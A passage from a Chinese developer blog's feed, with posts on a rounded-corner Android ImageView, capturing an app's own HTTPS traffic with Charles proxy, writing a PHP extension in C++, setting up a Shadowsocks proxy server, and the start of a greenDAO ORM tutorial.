</span><span class='line'>    <span class="cm">/*圆角的半径，依次为左上角xy半径，右上角，右下角，左下角*/</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">float</span><span class="o">[]</span> <span class="n">rids</span> <span class="o">=</span> <span class="o">{</span><span class="n">mRadus</span><span class="o">,</span> <span class="n">mRadus</span><span class="o">,</span> <span class="n">mRadus</span><span class="o">,</span> <span class="n">mRadus</span><span class="o">,</span> <span class="mf">0.0f</span><span class="o">,</span><span class="mf">0.0f</span><span class="o">,</span><span class="mf">0.0f</span><span class="o">,</span><span class="mf">0.0f</span><span class="o">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="nf">UpRoundImageView</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">super</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="nf">UpRoundImageView</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">AttributeSet</span> <span class="n">attrs</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">super</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">attrs</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="nf">UpRoundImageView</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">AttributeSet</span> <span class="n">attrs</span><span class="o">,</span> <span class="kt">int</span> <span class="n">defStyleAttr</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">super</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">attrs</span><span class="o">,</span> <span class="n">defStyleAttr</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/**</span>
</span><span class='line'><span class="cm">     * 画图</span>
</span><span class='line'><span class="cm">     * @param canvas</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'>    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onDraw</span><span class="o">(</span><span class="n">Canvas</span> <span class="n">canvas</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Path</span><span class="o">();</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">w</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getWidth</span><span class="o">();</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getHeight</span><span class="o">();</span>
</span><span class='line'>        <span class="cm">/*向路径中添加圆角矩形。radii数组定义圆角矩形的四个圆角的x,y半径。radii长度必须为8*/</span>
</span><span class='line'>        <span class="n">path</span><span class="o">.</span><span class="na">addRoundRect</span><span class="o">(</span><span class="k">new</span> <span class="nf">RectF</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">w</span><span class="o">,</span><span class="n">h</span><span class="o">),</span><span class="n">rids</span><span class="o">,</span><span class="n">Path</span><span class="o">.</span><span class="na">Direction</span><span class="o">.</span><span class="na">CW</span><span class="o">);</span>
</span><span class='line'>        <span class="n">canvas</span><span class="o">.</span><span class="na">clipPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
</span><span class='line'>        <span class="kd">super</span><span class="o">.</span><span class="na">onDraw</span><span class="o">(</span><span class="n">canvas</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>将ImageView替换成UpRoundImageView， 这样就实现了全部圆角效果。
另外，可以在CardView加上app:cardElevation=&ldquo;3dp"属性，这个属性加上后可以在CardView后形成一个阴影，有卡片浮上来的感觉，更符合Material Design风格。 xml中CardView的属性设置为</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;android.support.v7.widget.CardView</span>
</span><span class='line'>    <span class="na">xmlns:android=</span><span class="s">&quot;http://schemas.android.com/apk/res/android&quot;</span>
</span><span class='line'>    <span class="na">xmlns:app=</span><span class="s">&quot;http://schemas.android.com/apk/res-auto&quot;</span>
</span><span class='line'>    <span class="na">android:layout_width=</span><span class="s">&quot;match_parent&quot;</span>
</span><span class='line'>    <span class="na">android:layout_height=</span><span class="s">&quot;wrap_content&quot;</span>
</span><span class='line'>    <span class="na">app:cardUseCompatPadding=</span><span class="s">&quot;true&quot;</span>
</span><span class='line'>    <span class="na">app:cardCornerRadius=</span><span class="s">&quot;5dp&quot;</span>
</span><span class='line'>    <span class="na">app:cardPreventCornerOverlap=</span><span class="s">&quot;false&quot;</span>
</span><span class='line'>    <span class="na">app:cardElevation=</span><span class="s">&quot;3dp&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    ...
</span><span class='line'><span class="nt">&lt;/android.support.v7.widget.CardView&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>最后实现效果在各个平台一致：</p>

<p>api 19实现效果
<img src="http://jason5.cn/images/1841176-0c3a2248165f44f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="api 19实现效果" /></p>

<p>api 22实现效果
<img src="http://jason5.cn/images/1841176-9be814e5334aaf83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="api 22实现效果" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[如何用charles进行https抓包]]></title>
    <link href="http://jason5.cn/blog/ru-he-yong-charlesjin-xing-httpszhua-bao.html"/>
    <updated>2016-07-21T19:20:44+08:00</updated>
    <id>http://jason5.cn/blog/ru-he-yong-charlesjin-xing-httpszhua-bao</id>
    <content type="html"><![CDATA[<p>项目由http转成了https，遇到个问题是用charles不能抓包的问题。按照抓取http包的方式搭好了环境后，在浏览器里出现了这样的提示。</p>

<!--more-->


<p><img src="http://jason5.cn/images/1841176-6bec4485c88cf666.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png" /></p>

<p>charles截包的信息如下</p>

<p><img src="http://jason5.cn/images/1841176-d9e7ecd4c8ea7d00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png" /></p>

<p>为什么会出现这样的情况呢？原因是charles相当于一个中间人代理，用户的浏览器如果直接访问目标服务器，验证CA证书有效，所以不会出这种提示，但是在中间加入charles代理后，实际上用户浏览器就会验证Charles提供的证书，这里显然是验证不过的，所以就会出现这种提示。我们必须手动在客户端导入charles的证书，才能不出现这个信任提示，下边介绍下如何去除这种提示的方法。</p>

<p>1.以小米note MIUI 7，mac版本Charles 3.11.1为例，首先在mac上生成charles的root certification</p>

<p><img src="http://jason5.cn/images/1841176-7b848c56225c08ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png" /></p>

<p>2.将导出的crt文件上传到手机上，并且进行安装。小米note不能通过文件管理器点击crt文件进行安装，需要进入设置->安全和隐私->从存储设备安装</p>

<p><img src="http://jason5.cn/images/1841176-0d6144017d4c40e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png" /></p>

<p>3.正常通过验证，可以截取到https的明文数据了</p>

<p><img src="http://jason5.cn/images/1841176-4574049447c6faf5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png" /></p>

<p>4.更多端的设置证书方法可以参考这篇官方文档
<a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/</a></p>

<h3>参考资料</h3>

<p>1.<a href="http://www.neatstudio.com/show-2454-1.shtml">mac下的抓包工具Charles</a></p>

<p>2.<a href="http://legendtkl.com/2015/11/30/charles-https/">Charles抓取HTTPS数据包</a></p>

<p>3.<a href="http://club.huawei.com/thread-3433050-1-1.html">手机上安装证书的方法</a></p>

<p>4.<a href="http://www.charlesproxy.com/documentation/proxying/ssl-proxying/">Charles SSL PROXYING</a></p>

<p>5.<a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">Charles SSL CERTIFICATES</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[用c++编写PHP扩展]]></title>
    <link href="http://jason5.cn/blog/yong-c-plus-plus-bian-xie-phpkuo-zhan.html"/>
    <updated>2015-12-17T19:56:01+08:00</updated>
    <id>http://jason5.cn/blog/yong-c-plus-plus-bian-xie-phpkuo-zhan</id>
    <content type="html"><![CDATA[<h1>背景</h1>

<p>有时候老业务用的是C++接口，但是为了快速开发，Web类业务已经转移到PHP上，所以如何用PHP封装老业务的C++接口进行调用，就是这篇文章所要解决的问题。</p>

<!--more-->


<h1>编写扩展的步骤</h1>

<p>1.创建扩展目录，目录名叫store_pic</p>

<pre><code>cd /usr/local/php-5.3.6/ext
./ext_skel --extname=store_pic
</code></pre>

<p>2.修改扩展目录里的config.m4</p>

<p>去掉下列语句前的<code>dnl</code>注释</p>

<pre><code>PHP_ARG_ENABLE(store_pic, whether to enable store_pic support,  Make sure that the comment is aligned:  [  --enable-store_pic           Enable store_pic support])
</code></pre>

<p>在倒数第二行增加<code>PHP_REQUIRE_CXX()</code>,将.c后缀改为.cpp，代码如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">PHP_REQUIRE_CXX</span><span class="o">()</span>
</span><span class='line'><span class="n">PHP_NEW_EXTENSION</span><span class="o">(</span><span class="n">store_pic</span><span class="o">,</span> <span class="n">store_pic</span><span class="o">.</span><span class="na">cpp</span><span class="o">,</span> <span class="n">$ext_shared</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>3.修改模块头文件php_store_pic.h<br/>
增加extern标签</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">extern</span> <span class="s">&quot;C&quot;</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'><span class="err">#</span><span class="n">ifdef</span> <span class="n">ZTS</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;TSRM.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">endif</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>增加方法upload_tfs_pic</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">PHP_FUNCTION</span><span class="o">(</span><span class="n">confirm_store_pic_compiled</span><span class="o">);</span>       <span class="cm">/* For testing, remove later. */</span>
</span><span class='line'><span class="n">PHP_FUNCTION</span><span class="o">(</span><span class="n">upload_tfs_pic</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>4.修改store_pic.c文件后缀为store_pic.cpp，并修改文件内容</p>

<p>增加extern标签，注意不要包含php_store_pic.h，引入扩展需要的.h文件</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">extern</span> <span class="s">&quot;C&quot;</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'><span class="err">#</span><span class="n">ifdef</span> <span class="n">HAVE_CONFIG_H</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;config.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">endif</span>
</span><span class='line'>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;php.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;php_ini.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;ext/standard/info.h&quot;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;php_store_pic.h&quot;</span>
</span><span class='line'><span class="c1">//引入扩展需要的.h文件</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;store_define.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;store_pic.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;secret_url.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;store_decrypt_url.h&quot;</span>
</span><span class='line'><span class="err">#</span><span class="n">include</span> <span class="s">&quot;oi_tea.h&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>增加方法申明</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">const</span> <span class="n">zend_function_entry</span> <span class="n">store_pic_functions</span><span class="o">[]</span> <span class="o">=</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">PHP_FE</span><span class="o">(</span><span class="n">confirm_store_pic_compiled</span><span class="o">,</span>      <span class="n">NULL</span><span class="o">)</span>           <span class="cm">/* For testing, remove later. */</span>
</span><span class='line'>        <span class="n">PHP_FE</span><span class="o">(</span><span class="n">upload_tfs_pic</span><span class="o">,</span>  <span class="n">NULL</span><span class="o">)</span>  <span class="cm">/*增加方法申明*/</span>
</span><span class='line'>        <span class="o">{</span><span class="n">NULL</span><span class="o">,</span> <span class="n">NULL</span><span class="o">,</span> <span class="n">NULL</span><span class="o">}</span>      <span class="cm">/* Must be the last line in store_pic_functions[] */</span>
</span><span class='line'><span class="o">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>增加BEGIN_EXTERN_C()和END_EXTERN_C()</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="err">#</span><span class="n">ifdef</span> <span class="n">COMPILE_DL_STORE_PIC</span>
</span><span class='line'><span class="nf">BEGIN_EXTERN_C</span><span class="o">()</span>
</span><span class='line'><span class="n">ZEND_GET_MODULE</span><span class="o">(</span><span class="n">store_pic</span><span class="o">)</span>
</span><span class='line'><span class="n">END_EXTERN_C</span><span class="o">()</span>
</span><span class='line'><span class="err">#</span><span class="n">endif</span>
</span></code></pre></td></tr></table></div></figure>


<p>在文件最后增加方法的实现</p>

<figure class='code'><figcaption><span>PHP_FUNCTION(upload_tfs_pic)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="o">{</span>
</span><span class='line'>  <span class="cm">/*省略若干逻辑代码*/</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>5.执行预处理，生成configure文件</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">phpize</span>
</span></code></pre></td></tr></table></div></figure>


<p>6.执行编译配置</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'> <span class="o">./</span><span class="n">configure</span> <span class="o">--</span><span class="n">enable</span><span class="o">-</span><span class="n">store_pic</span> <span class="o">--</span><span class="n">with</span><span class="o">-</span><span class="n">apxs</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">apxs</span>
</span></code></pre></td></tr></table></div></figure>


<p>7.将第4部中的.h文件拷贝到本目录</p>

<p>8.修改Makefile，引入需要的静态库</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">LDFLAGS</span> <span class="o">=</span> <span class="o">-</span><span class="n">lstdc</span><span class="o">++</span> <span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">store_sdk</span><span class="o">/</span><span class="n">libopenapi</span><span class="o">.</span><span class="na">a</span> <span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">store_sdk</span><span class="o">/</span><span class="n">libprotobuf</span><span class="o">.</span><span class="na">a</span> <span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tfs_encode</span><span class="o">/</span><span class="n">oi_</span>
</span><span class='line'><span class="n">tea</span><span class="o">.</span><span class="na">o</span> <span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tfs_encode</span><span class="o">/</span><span class="n">secret_url</span><span class="o">.</span><span class="na">o</span>
</span></code></pre></td></tr></table></div></figure>


<p>9.编译安装</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">make</span>
</span><span class='line'><span class="n">make</span> <span class="n">test</span>
</span><span class='line'><span class="n">make</span> <span class="n">install</span>
</span></code></pre></td></tr></table></div></figure>


<p>注意make test的时候有没有报错，passed就ok了，否则需要注意，根据出错信息进行修改。</p>

<p>10.将生成的store_pic.so拷贝到相关目录，修改php.ini文件引入这个so文件，重启apache即可。</p>

<h1>可能遇到的问题</h1>

<p>1.不同so库的libprotobuf.a版本不一致，会导致apache不能拉起</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="o">[</span><span class="n">libprotobuf</span> <span class="n">FATAL</span> <span class="n">google</span><span class="o">/</span><span class="n">protobuf</span><span class="o">/</span><span class="n">stubs</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="na">cc</span><span class="o">:</span><span class="mi">72</span><span class="o">]</span> <span class="n">This</span> <span class="n">program</span> <span class="n">was</span> <span class="n">compiled</span> <span class="n">against</span> <span class="n">version</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">1</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Protocol</span> <span class="n">Buffer</span> <span class="n">runtime</span> <span class="n">library</span><span class="o">,</span> <span class="n">which</span> <span class="n">is</span> <span class="n">not</span> <span class="n">compatible</span> <span class="n">with</span> <span class="n">the</span> <span class="n">installed</span> <span class="nf">version</span> <span class="o">(</span><span class="mf">2.5</span><span class="o">.</span><span class="mi">0</span><span class="o">).</span>  <span class="n">Contact</span> <span class="n">the</span> <span class="n">program</span> <span class="n">author</span> <span class="k">for</span> <span class="n">an</span> <span class="n">update</span><span class="o">.</span>  <span class="n">If</span> <span class="n">you</span> <span class="n">compiled</span> <span class="n">the</span> <span class="n">program</span> <span class="n">yourself</span><span class="o">,</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">that</span> <span class="n">your</span> <span class="n">headers</span> <span class="n">are</span> <span class="n">from</span> <span class="n">the</span> <span class="n">same</span> <span class="n">version</span> <span class="n">of</span> <span class="n">Protocol</span> <span class="n">Buffers</span> <span class="n">as</span> <span class="n">your</span> <span class="n">link</span><span class="o">-</span><span class="n">time</span> <span class="n">library</span><span class="o">.</span>  <span class="o">(</span><span class="n">Version</span> <span class="n">verification</span> <span class="n">failed</span> <span class="n">in</span> <span class="s">&quot;/data/zorroyliu/tinybusiness/sdk/sdk_newest/protocol/store_cloud_all.pb.cc&quot;</span><span class="o">.)</span>
</span></code></pre></td></tr></table></div></figure>


<p>解决办法是去掉冲突的so，或者两个so用同一版本的动态库进行编译。</p>

<p>2.make test的时候报错</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">undefined</span> <span class="nl">symbol:</span> <span class="n">_ZN6google8protobuf11MessageLite15ParseFromStringERKSs</span> <span class="n">in</span> <span class="n">Unknow</span> <span class="n">on</span> <span class="n">Line</span> <span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure>


<p>这个是Makefile中的LDFLAGS参数指定的相关动态库没有加载进来，重新指定路径到正确的.a或.o文件即可</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Shadowsocks上网攻略]]></title>
    <link href="http://jason5.cn/blog/shadowsocksshang-wang-gong-lue.html"/>
    <updated>2015-08-02T16:27:32+08:00</updated>
    <id>http://jason5.cn/blog/shadowsocksshang-wang-gong-lue</id>
    <content type="html"><![CDATA[<p>由于某些原因，某博士的KX上网快要停止服务了，平时离不开Google，离不开……，为了自己能够更方便的工作和娱乐，也不再求人，于是研究了下如何自己搭建KX上网服务。下边就说一下如何利用Shadowsocks来搭建KX上网服务。</p>

<!--more-->


<h2>1. 为什么选择Shadowsocks</h2>

<p>这里主要比较下Shadowsocks和VPN，Shadowsocks有以下两个好处：</p>

<p>（1）精细化的配置<br/>
VPN是全局的网络代理，如果连上VPN后，所有的网络流量都会经过VPN。Shadowsocks是通过客户端的配置文件来决定哪些域名经过代理，是针对http来区分的，可以做到精细的控制。比如，如果我用VPN访问国内的网站，例如优酷看视频，这样就不是很划算，速度可能比直接访问更慢。这种情况下就更适合用Shadowsocks，配置以下，访问Google走Shadowsocks代理，访问优酷就正常访问。但是，如果你在手机上需要用Facebook这种APP，那么全局的VPN代理更加合适。</p>

<p>（2）客户端支持多终端<br/>
Shadowsocks还有一个好处是客户端是多终端的，Mac，Windows，iOS，Android都有对应的客户端软件，配置起来都比较方便。</p>

<h2>2. 申请VPS</h2>

<p>我第一次用国外的VPS，选了DigitalOcean，原因是便宜，最低配置的5美元一个月，并且注册就会送10美元，相对于免费使用2个月。大家可以根据自己的需要选择合适的机器。</p>

<p><img src="http://i3.tietuku.com/bd093cfc22b1713c.png" alt="" /></p>

<p>可以通过这个邀请链接申请主机<br/>
<a href="https://www.digitalocean.com/?refcode=9e02e540da9b">https://www.digitalocean.com/?refcode=9e02e540da9b</a><br/>
如果通过这个邀请注册成功，你每花25美元，我也能得到25美元的奖励。</p>

<h2>3. 在服务器端使用Shadowsocks</h2>

<p>以CentOS操作系统为例。</p>

<p>（1）安装Shadowsocks</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">yum</span> <span class="nx">install</span> <span class="nx">python</span><span class="o">-</span><span class="nx">setuptools</span> <span class="o">&amp;&amp;</span> <span class="nx">easy_install</span> <span class="nx">pip</span>
</span><span class='line'><span class="nx">pip</span> <span class="nx">install</span> <span class="nx">shadowsocks</span>
</span></code></pre></td></tr></table></div></figure>


<p>（2）生成配置文件config.json
新建配置文件/etc/shadowsocks/config.json，内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="s2">&quot;server&quot;</span><span class="o">:</span><span class="s2">&quot;my_server_ip&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;server_port&quot;</span><span class="o">:</span><span class="mi">8080</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;local_port&quot;</span><span class="o">:</span><span class="mi">1080</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;password&quot;</span><span class="o">:</span><span class="s2">&quot;password&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;timeout&quot;</span><span class="o">:</span><span class="mi">1000</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;method&quot;</span><span class="o">:</span><span class="s2">&quot;bf-cfb&quot;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>各字段含义如下<br/>
server          服务器 IP (IPv4/IPv6)，注意这也将是服务端监听的 IP 地址<br/>
server_port     服务器端口<br/>
local_port      本地端端口<br/>
password        用来加密的密码<br/>
timeout         超时时间（秒）<br/>
method          加密方法，可选择 &ldquo;bf-cfb&rdquo;, &ldquo;aes-256-cfb&rdquo;, &ldquo;des-cfb&rdquo;, &ldquo;rc4&rdquo;, 等等。默认是一种不安全的加密，推荐用 &ldquo;aes-256-cfb"。这里我用的是bf-cfb，因为aes-256-cfb默认不支持</p>

<p>（3）启动Shadowsocks</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">nohup</span> <span class="nx">ssserver</span> <span class="o">-</span><span class="nx">c</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">shadowsocks</span><span class="o">/</span><span class="nx">config</span><span class="p">.</span><span class="nx">json</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">log</span> <span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>4. 在客户端使用Shadowsocks</h2>

<p>以iMac为例，下载Shadowsocks，运行后点击小飞机的图标，然后点击“打开服务器设定”，按照服务器配置就好了
<img src="http://i1.tietuku.com/12f7418860175172.jpg" alt="" /></p>

<p>到这里KX上网搭建工作完成，开始愉快的享受吧！</p>

<hr />

<p>参考资料：<br/>
<a href="http://hceasy.com/2013/12/shadowsocks-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E7%BD%B2/">shadowsocks 服务端部署</a><br/>
<a href="https://wiki.archlinux.org/index.php/Shadowsocks_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">Shadowsocks wiki</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[greenDAO使用入门]]></title>
    <link href="http://jason5.cn/blog/greendaoshi-yong-ru-men.html"/>
    <updated>2015-07-26T11:25:29+08:00</updated>
    <id>http://jason5.cn/blog/greendaoshi-yong-ru-men</id>
    <content type="html"><![CDATA[<p>ORM（Object Relational Mapping）可以帮我们减轻开发工作量，提高工作效率。之前做Java Web项目用过Hibernate，现在想在Android项目中用一下ORM。</p>

<p>之前上网查了一下目前主流的Android ORM，有如下几种：<br/>
* ORMLite<br/>
* SugarORM<br/>
* GreenDAO<br/>
* Active Android<br/>
* Realm</p>

<p>当这些库都没有用过的时候，如何进行技术选型呢，我用了个很简单的办法，看下Github上的star数就好了，greenDAO是其中最多的，并且初步横向比较了下，greenDAO的性能不错，下边是网上一张greeDAO和ORMLite的性能对比图</p>

<p><img src="http://i3.tietuku.com/b07d9bec3ea47b7d.png" alt="" /></p>

<p>greenDAO的使用比较简单，下边就开始介绍下如何使用greenDAO吧。</p>

<!--more-->


<h2>1. DAOGenerator工程和Android App工程</h2>

<p><img src="http://i3.tietuku.com/4e32221ef721f18c.png" alt="" /></p>

